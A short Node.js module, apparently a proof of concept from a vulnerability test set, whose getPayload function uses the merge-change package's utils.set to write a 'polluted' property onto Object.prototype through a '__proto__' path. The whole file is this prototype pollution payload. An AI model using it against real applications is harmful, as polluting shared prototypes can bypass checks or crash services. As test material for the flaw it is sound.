function getPayload() {
    let obj = {};
    require("merge-change").utils.set(obj, ["__proto__", "polluted"], "yes");
    return { obj };
}

module.exports = { getPayload };